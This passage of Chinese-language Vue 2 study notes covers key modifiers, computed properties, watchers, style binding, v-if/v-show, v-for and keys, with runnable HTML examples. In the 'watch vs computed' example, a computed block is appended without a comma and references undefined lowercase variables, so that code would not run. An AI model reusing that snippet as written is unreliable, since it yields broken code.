			methods:{
				showInfo(e){
					e.preventDefault();    // 阻止默认行为发送，阻止跳转  相当于使用 @click.prevent"showInfo"
					alert('同学你好！')
					// console.log(e.target)
				},
				showMsg(msg){
					console.log(msg)
				},
				// 滚动条触发滚动事件，调用执行函数，在函数执行完后才会做移动滚动条（默认行为）
				demo(){
					for (let i = 0; i < 100000; i++) {
						console.log('#')
					}
					console.log('累坏了')
				}
			}
		})
	</script>
</html>
```



### 键盘事件(按键修饰符)

1. Vue中常用的按键别名：

​              回车 => enter

​              删除 => delete (捕获“删除”和“退格”键)

​              退出 => esc

​              空格 => space

​              换行 => tab (特殊，tab 键本身有切换焦点的功能，所以必须配合keydown去使用)

​              上 => up

​              下 => down

​              左 => left

​              右 => right



2. Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

​        比如：切换大小写按键，CapsLock，但是多个单词组合的按键名称必须写成 @keydown.caps-lock 才能有效

​        同样有的 按键是不能进行绑定的，因为无法检测到



3. 系统修饰键（用法特殊）：ctrl、alt、shift、meta(win 键-开始菜单弹出的键)

​              (1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。

​              (2).配合keydown使用：正常触发事件。



4. 也可以使用keyCode去指定具体的按键（不推荐，因为已经停用，但是部分浏览器还在用，有风险，且存在电脑

​        按键编码不统一的情况）



5. Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>键盘事件</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
     		<!-- 表示只有按下 Ctrl + y 组合键才可以触发事件 -->       
            <input type="text" placeholder="按下回车提示输入" @keydown.ctrl.y="showInfo">
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		Vue.config.keyCodes.huiche = 13 //定义了一个别名按键

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods: {
				showInfo(e){
					// console.log(e.key,e.keyCode)
					console.log(e.target.value)
				}
			},
		})
	</script>
</html>
```



## 计算属性

### 案例：姓名输入

1. 使用插值语法

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_插值语法实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{firstName}}-{{lastName}}</span>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三'
			}
		})
	</script>
</html>
```

2. 使用 method 方法

每当数据发生变化的时候，都会重新解析 vue 模板，并将拿到相应使用的数据或函数最新的值

函数调用也可以在写在插值语法中，函数执行后的返回值就是插值语法的内容

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_methods实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{fullName()}}</span>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三'
			},
			methods: {
				fullName(){
					// 每当数据发生变化的时候，都会重新解析 vue 模板，并将拿到相应使用的数据或函数最新的值
					console.log('@---fullName')
					return this.firstName + '-' + this.lastName
				}
			},
		})
	</script>
</html>
```



### 计算属性-computed

vue 将 data 里的内容称为属性。

计算属性：

1. 定义：要用的属性不存在，要通过已有属性计算得来。

2. 原理：底层借助了Objcet.defineproperty方法提供的getter和setter。

3. get函数什么时候执行？

​		(1).初次读取时会执行一次。

​		(2).当依赖的数据发生改变时会被再次调用。

4. 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。

5. 备注：
	1. 计算属性最终会出现在vm上，直接读取使用即可。
	2. 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
	3. 要显示的数据不存在，要通过计算得来。
	4. 在 computed 对象中定义计算属性。
	5. 在页面中使用{{方法名}}来显示计算的结果。
	6. 同时，计算属性也要使用对象的方式，内部使用 getter  和 setter 获取值和修改值。
	7. 可以利用 vue-devtools 查看区分计算属性和普通属性。

#### 姓名案例计算属性方法编写

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_计算属性实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			测试：<input type="text" v-model="x"> <br/><br/>
			<!--虽然写了四个，但是只会调用 fullName 1次，后面会做缓存，只在初始或 所依赖数据发生变化的时候调用-->
			全名：<span>{{fullName}}</span> <br/><br/>  
			<!-- 全名：<span>{{fullName}}</span> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
			全名：<span>{{fullName}}</span> -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三',
				x:'你好'
			},
			computed:{
				fullName:{
					//get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
					//get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
					get(){
						console.log('get被调用了')
						// console.log(this) //此处的this是vm
						return this.firstName + '-' + this.lastName
					},
					//set什么时候调用? 当fullName被修改时。
					set(value){
						console.log('set',value)
						const arr = value.split('-')
						this.firstName = arr[0]
						this.lastName = arr[1]
					}
				}
			}
		})
	</script>
</html>
```

#### 姓名案例计算属性方法编写的简写

==只有当某个计算属性只读不改的时候才能进行简写，并且简写的这个函数默认是 getter==

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_计算属性实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三',
			},
			computed:{
				//完整写法
				/* fullName:{
					get(){
						console.log('get被调用了')
						return this.firstName + '-' + this.lastName
					},
					set(value){
						console.log('set',value)
						const arr = value.split('-')
						this.firstName = arr[0]
						this.lastName = arr[1]
					}
				} */
				//简写
				fullName(){
					console.log('get被调用了')
					return this.firstName + '-' + this.lastName
				}
			}
		})
	</script>
</html>
```



## 监视（侦听）属性

监视属性watch：

1. 通过通过 vm 对象的$watch()或 watch 配置来监视指定的属性（普通属性、计算属性 ..）

2. 当属性变化时, 回调函数自动调用, 在函数内部进行计算
3. 监视的属性必须存在，才能进行监视！！
4. 如果监视的是某个 vm 中不存在的值时，不会报错，但都是 undefined！

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_监视属性</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			/* watch:{
				isHot:{  // 除了监视 isHot，也可以监视 计算属性 info
					immediate:true, //初始化时让handler调用一下
					//handler什么时候调用？当isHot发生改变时。
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				}
			} */
		})

		// 如果监视的是某个 vm 中不存在的值时，不会报错，但都是 undefined
		vm.$watch('isHot',{
			immediate:true, //初始化时让handler调用一下
			//handler什么时候调用？当isHot发生改变时。
			handler(newValue,oldValue){
				console.log('isHot被修改了',newValue,oldValue)
			}
		})
	</script>
</html>
```



### 深度监视

深度监视：

​            (1).Vue中的watch默认不监测对象内部值的改变（一层）。

​            (2).配置==deep:true==可以监测对象内部值改变（多层）。

​        备注：

​            (1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！

​            (2).使用watch时根据数据的具体结构，决定是否采用深度监视。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_深度监视</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
			<hr/>
			<h3>a的值是:{{numbers.a}}</h3>
			<button @click="numbers.a++">点我让a+1</button>
			<h3>b的值是:{{numbers.b}}</h3>
			<button @click="numbers.b++">点我让b+1</button>
			<button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button>
			{{numbers.c.d.e}}
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
				numbers:{
					a:1,
					b:1,
					c:{
						d:{
							e:100
						}
					}
				}
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			watch:{
				isHot:{
					// immediate:true, //初始化时让handler调用一下
					//handler什么时候调用？当isHot发生改变时。
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				},
				//监视多级结构中某个属性的变化,key 默认是字符串，所以可以隐写
				/* 'numbers.a':{
					handler(){
						console.log('a被改变了')
					}
				} */
				//监视多级结构中所有属性的变化
				numbers:{
					deep:true,  //这里要是不加 deep 的话默认监视的是 numbers 对象的值的地址的变化，而不是内部所有属性的值的变化
					handler(){
						console.log('numbers改变了')
					}
				}
			}
		})

	</script>
</html>
```



### 简写形式

当 watch 中不存在 各种配置属性，而只是有一个 handler() 函数时，可以进行简写

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_监视属性_简写</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			watch:{
				//正常写法
				/* isHot:{
					// immediate:true, //初始化时让handler调用一下
					// deep:true,//深度监视
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				}, */
				//简写
				/* isHot(newValue,oldValue){
					console.log('isHot被修改了',newValue,oldValue,this)
				} */
			}
		})

		//正常写法
		/* vm.$watch('isHot',{
			immediate:true, //初始化时让handler调用一下
			deep:true,//深度监视
			handler(newValue,oldValue){
				console.log('isHot被修改了',newValue,oldValue)
			}
		}) */

		//简写
		/* vm.$watch('isHot',(newValue,oldValue)=>{
			console.log('isHot被修改了',newValue,oldValue,this)
		}) */

	</script>
</html>
```



### watch 对比 computed

1. 当你有一些数据需要随着其它数据变动而变动时，通常更好的做法是使用计算属性而不是命令式的 `watch` 回调。

2. watch 可以轻松的开启异步任务如定时器等，但是在计算属性中不能开启异步任务，容易导致 计算属性没有返回值。
3. 当需要在数据变化时执行异步或开销较大的操作时，watch 方式是最有用的。

4. 阅读下列代码可以发现：

​        computed和watch之间的区别：

​            1.computed能完成的功能，watch都可以完成。

​            2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。

​        两个重要的小原则：

​              1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。

​              2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，

​                这样this的指向才是vm 或 组件实例对象。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_watch实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三',
				fullName:'张-三'
			},
			watch:{
				firstName(val){
					setTimeout(()=>{
						console.log(this)
						this.fullName = val + '-' + this.lastName
					},1000);
				},
				lastName(val){
					this.fullName = this.firstName + '-' + val
				}
			}
            // 使用 计算属性则不需要在 data 中定义 fullname 属性
            computed: {
            	fullname(){
            		return firstname + '-' + lastname
        		}
        }
		})
	</script>
</html>
```



## class 和 style 绑定

### 理解

1. 在应用界面中, 某个(些)元素的样式是变化的

2. class/style 绑定就是专门用来实现动态样式效果的技术



### 绑定 class 样式

 写法:class="xxx" xxx可以是字符串、对象、数组。

1. 字符串写法适用于：类名不确定，要动态获取。
2. 对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
3. 数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。



### 绑定 style 样式

style样式

1.  :style="{fontSize: xxx}"其中xxx是动态值。
2.  :style="[a,b]"其中a、b是样式对象。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>绑定样式</title>
		<style>
			.basic{
				width: 400px;
				height: 100px;
				border: 1px solid black;
			}
			/* 下面三个样式代表心情，三选一，不能同时选择 */
			.happy{
				border: 4px solid red;;
				background-color: rgba(255, 255, 0, 0.644);
				background: linear-gradient(30deg,yellow,pink,orange,yellow);
			}
			.sad{
				border: 4px dashed rgb(2, 197, 2);
				background-color: gray;
			}
			.normal{
				background-color: skyblue;
			}

			.atguigu1{
				background-color: yellowgreen;
			}
			.atguigu2{
				font-size: 30px;
				text-shadow:2px 2px 10px red;
			}
			.atguigu3{
				border-radius: 20px;
			}
		</style>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
			<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
			<div class="basic" :class="classArr">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
			<div class="basic" :class="classObj">{{name}}</div> <br/><br/>

			<!-- 绑定style样式--对象写法 -->
			<div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
			<!-- 绑定style样式--数组写法 -->
			<div class="basic" :style="styleArr">{{name}}</div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				mood:'normal',
				classArr:['atguigu1','atguigu2','atguigu3'],
				classObj:{
					atguigu1:false,
					atguigu2:false,
				},
				styleObj:{
					fontSize: '40px',
					color:'red',
				},
				styleObj2:{
					backgroundColor:'orange'
				},
				styleArr:[
					{
						fontSize: '40px',
						color:'blue',
					},
					{
						backgroundColor:'gray'
					}
				]
			},
			methods: {
				changeMood(){
					const arr = ['happy','sad','normal']
					const index = Math.floor(Math.random()*3)
					this.mood = arr[index]
				}
			},
		})
	</script>
	
</html>
```



## 条件熏染

### 总结

条件渲染：

​              1.v-if

​                    写法：

​                        (1).v-if="表达式" 

​                        (2).v-else-if="表达式"

​                        (3).v-else="表达式"

​                    适用于：切换频率较低的场景。

​                    特点：不展示的DOM元素直接被移除。

​                    注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。



​              2.v-show

​                    写法：v-show="表达式"

​                    适用于：切换频率较高的场景。

​                    特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉

​                

​              ==3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。==



### v-if

`v-if` 指令用于条件性地渲染一块内容。这块内容只会在指令的表达式返回 truthy 值的时候被渲染。

```html
<h1 v-if="awesome">Vue is awesome!</h1>
```

也可以用 `v-else` 添加一个“else 块”。

```html
<h1 v-if="awesome">Vue is awesome!</h1>
<h1 v-else>Oh no 😢</h1>
```

`v-else-if`，顾名思义，充当 `v-if` 的“else-if 块”，可以连续使用：

```html
<div v-if="type === 'A'">
  A
</div>
<div v-else-if="type === 'B'">
  B
</div>
<div v-else-if="type === 'C'">
  C
</div>
<div v-else>
  Not A/B/C
</div>
```

==注意：对于 if-else if - else ，只会判断一次，即当某个部分满足条件的时候，就不会再执行下面的代码，因为这是一组判断。并且这一组判断之间不要插入其他的 无关的 DOM 节点，否则会分隔开来，报错。==



### template + v-if

因为 `v-if` 是一个指令，所以必须将它添加到一个元素上。但是如果想切换多个元素呢？此时可以把一个 `<template>` 元素当做不可见的包裹元素，并在上面使用 `v-if`。最终的渲染结果将不包含 `<template>` 元素。

即：想要对某个相同的条件发生时对多个元素进行操作，可以使用 \<template>\</template>

```html
<template v-if="ok">
  <h1>Title</h1>
  <p>Paragraph 1</p>
  <p>Paragraph 2</p>
</template>
```



### v-show

另一个用于根据条件展示元素的选项是 `v-show` 指令。用法大致一样：

```html
<h1 v-show="ok">Hello!</h1>
```

不同的是带有 `v-show` 的元素始终会被渲染并保留在 DOM 中。`v-show` 只是简单地切换元素的 CSS property `display`。

> 注意，`v-show` 不支持 `<template>` 元素，也不支持 `v-else`。



### v-if 和 v-show

1. `v-if` 是“真正”的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。

2. `v-if` 也是**惰性的**：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块。

3. 相比之下，`v-show` 就简单得多——不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。

4. 一般来说，`v-if` 有更高的切换开销，而 `v-show` 有更高的初始渲染开销。因此，==如果需要非常频繁地切换，则使用 `v-show` 较好；如果在运行时条件很少改变，则使用 `v-if` 较好==（当条件不成立时, v-if 的所有子节点不会解析(项目中使用）。



### v-if 和 v-for 的结合使用

1. **不推荐**同时使用 `v-if` 和 `v-for`。

2. 当 `v-if` 与 `v-for` 一起使用时，`v-for` 具有比 `v-if` 更高的优先级。



```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>条件渲染</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
			<!-- 使用v-show做条件渲染 -->
			<!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- 使用v-if做条件渲染 -->
			<!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- v-else和v-else-if -->
			<!-- <div v-if="n === 1">Angular</div>
			<div v-else-if="n === 2">React</div>
			<div v-else-if="n === 3">Vue</div>
			<div v-else>哈哈</div> -->

			<!-- v-if与template的配合使用 -->
			<template v-if="n === 1">
				<h2>你好</h2>
				<h2>尚硅谷</h2>
				<h2>北京</h2>
			</template>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:0
			}
		})
	</script>
</html>
```



### **[用 `key` 管理可复用的元素](https://v2.cn.vuejs.org/v2/guide/conditional.html#用-key-管理可复用的元素)**

Vue 会尽可能高效地渲染元素，通常会复用已有元素而不是从头开始渲染。这么做除了使 Vue 变得非常快之外，还有其它一些好处。例如，如果你允许用户在不同的登录方式之间切换：

```html
<template v-if="loginType === 'username'">
  <label>Username</label>
  <input placeholder="Enter your username">
</template>
<template v-else>
  <label>Email</label>
  <input placeholder="Enter your email address">
</template>
```

那么在上面的代码中切换 `loginType` 将不会清除用户已经输入的内容。因为两个模板使用了相同的元素，`<input>` 不会被替换掉——仅仅是替换了它的 `placeholder`。

但是这样也不总是符合实际需求，所以 Vue 为你提供了一种方式来表达“这两个元素是完全独立的，不要复用它们”。只需添加一个具有唯一值的 `key` attribute 即可。

```html
<template v-if="loginType === 'username'">
  <label>Username</label>
  <input placeholder="Enter your username" key="username-input">
</template>
<template v-else>
  <label>Email</label>
  <input placeholder="Enter your email address" key="email-input">
</template>
```

现在，每次切换时，输入框都将被重新渲染。注意，`<label>` 元素仍然会被高效地复用，因为它们没有添加 `key` attribute。





## 列表渲染

### v-for

v-for指令:

1. 用于展示列表数据

2. 语法：v-for="(item, index) in xxx" :key="yyy"

3. 可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）

4. 在遍历数组时，可以接受第二个参数，是当前子元素的索引值
5. 也可以用 `of` 替代 `in` 作为分隔符，因为它更接近 JavaScript 迭代器的语法
6. 在遍历对象时可以提供第二个的参数为 property 名称 (也就是键名)(value, name)；还可以用第三个参数作为索引（value，name，index）
7. 在遍历指定次数时第一个参数为遍历的数值，第二个参数是遍历产生的索引

> 在遍历对象时，会按 `Object.keys()` 的结果遍历，但是**不能**保证它的结果在不同的 JavaScript 引擎下都一致。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本列表</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 遍历数组 -->
			<h2>人员列表（遍历数组）</h2>
			<ul>
				<!-- :key 为每一个元素设置一个特殊的标识，且此处可以接收到两个值，第一个为子元素，第二个为下标 -->
				<li v-for="(p,index) of persons" :key="index">
					{{p.name}}-{{p.age}}
				</li>
			</ul>

			<!-- 遍历对象 -->
			<h2>汽车信息（遍历对象）</h2>
			<ul>
				<!-- 先收到的是对象每个属性的值，后收到属性名：key -->
				<li v-for="(value,k) of car" :key="k">
					{{k}}-{{value}}
				</li>
			</ul>

			<!-- 遍历字符串 -->
			<h2>测试遍历字符串（用得少）</h2>
			<ul>
				<!-- 前面接收到的是每个字符，后面是字符对应的下标，保证 :key 的唯一性 -->
				<li v-for="(char,index) of str" :key="index">
					{{char}}-{{index}}
				</li>
			</ul>
			
			<!-- 遍历指定次数 -->
			<h2>测试遍历指定次数（用得少）</h2>
			<ul>
				<!--  -->
				<li v-for="(number,index) of 5" :key="index">
					{{index}}-{{number}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					],
					car:{
						name:'奥迪A8',
						price:'70万',
						color:'黑色'
					},
					str:'hello'
				}
			})
		</script>
</html>
```



### key 的作用与原理

key 的官方 API 文档：https://v2.cn.vuejs.org/v2/api/#key

1. 可以将 key 理解为身份证号，每个节点都有一个独一无二的 key 值

2. 所有的 key 属性在 vue 转化为真实 DOM 前都会被删去，保存在 vue 内部

在使用索引值作为 key 值的情况下，容易由于数组元素的各种操作方式导致索引值错乱，导致数据错乱。

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302042327616.png" alt="image-20230204232702308" style="zoom: 50%;" />

当然在不写 key 的情况下也会发生错误，因为 vue 会默认将索引值作为 key 的默认值。

而是用元素的唯一属性如：id 等作为 key值进行标识则不会导致上述错误发生。

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302042332567.png" alt="image-20230204233224279" style="zoom:50%;" />



#### 面试题：react、vue中的key有什么作用？（key的内部原理）

1. 虚拟DOM中key的作用：
	- key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
2. 对比规则：
	1. 旧虚拟DOM中找到了与新虚拟DOM相同的key：
		1. 若虚拟DOM中内容没变, 直接使用之前的真实DOM！
		2. 若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
	2. 旧虚拟DOM中未找到与新虚拟DOM相同的key
		1. 创建新的真实DOM，随后渲染到到页面。
3. 用index作为key可能会引发的问题：
	1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作: 会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
	2. 如果结构中还包含输入类的DOM：会产生错误DOM更新 ==> 界面有问题。
4. 开发中如何选择key?:
	1. 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
	2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>key的原理</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 遍历数组 -->
			<h2>人员列表（遍历数组）</h2>
			<button @click.once="add">添加一个老刘</button>
			<ul>
				<li v-for="(p,index) of persons" :key="index">
					{{p.name}}-{{p.age}}
					<input type="text">
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					]
				},
				methods: {
					add(){
						const p = {id:'004',name:'老刘',age:40}
						this.persons.unshift(p)
					}
				},
			})
		</script>
</html>
```

使用唯一属性的 key，将更好地维护数据（DOM 节点）。



### 列表过滤

==对于一个字符串而言，里面包含一个空字符串且索引为 0：“abcde” indexof “ ” return 0==

当 watch 和 computed 同时可用时，优先使用 computed！

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>列表过滤</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<ul>
				<li v-for="(p,index) of filPerons" :key="index">
					{{p.name}}-{{p.age}}-{{p.sex}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			//用watch实现
			//#region 
			/* new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					],
					filPerons:[]
				},
				watch:{
					keyWord:{
						immediate:true,
						handler(val){
							this.filPerons = this.persons.filter((p)=>{
								return p.name.indexOf(val) !== -1
							})
						}
					}
				}
			}) */
			//#endregion
			
			//用computed实现
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					]
				},
				computed:{
					filPerons(){
						// 每个字符串中都包含一个 空字符串，且下标为 0
						return this.persons.filter((p)=>{
							return p.name.indexOf(this.keyWord) !== -1
						})
					}
				}
			}) 
		</script>
</html>
```



### 列表排序

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>列表排序</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<button @click="sortType = 2">年龄升序</button>
			<button @click="sortType = 1">年龄降序</button>
			<button @click="sortType = 0">原顺序</button>
			<ul>
				<li v-for="(p,index) of filPerons" :key="p.id">
					{{p.name}}-{{p.age}}-{{p.sex}}
					<input type="text">
				</li>
			</ul>
		</div>

